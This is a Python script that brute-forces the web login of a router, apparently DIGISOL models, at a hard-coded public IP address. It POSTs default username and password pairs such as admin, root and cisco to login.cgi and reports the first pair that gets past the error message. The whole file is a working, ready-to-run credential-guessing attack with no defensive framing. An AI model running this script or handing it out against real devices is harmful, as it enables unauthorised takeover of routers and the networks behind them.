import os, sys, requests, time


# Tested for DIGISOL Routers
usernames = ['admin', '', 'root', 'user', 'cisco', '12345', '1234']
passwords = ['', 'admin', 'password', '1234', '12345', 'cisco']
url = 'http://103.125.161.188/login.cgi'
for user in usernames:
    print("USER LOOP"+user)
    for pas in passwords:
        print("PASS LOOP"+pas)                 
        print(f"[+] Using Credentials {user} and {pas}")
        requestToRouter = requests.post(url, data=f"username={user}&password={pas}&submit.htm?login.htm=Send", headers={"Content-Type": "application/x-www-form-urlencoded"})
        #print(requestToRouter.text)
        time.sleep(3)
        if 'Username or password error' not in requestToRouter.text:
            print(f"Success with "+str({user})+str({pas}))
            print("Exiting...")
            exit(0)
else:
    print("Not Fount...")
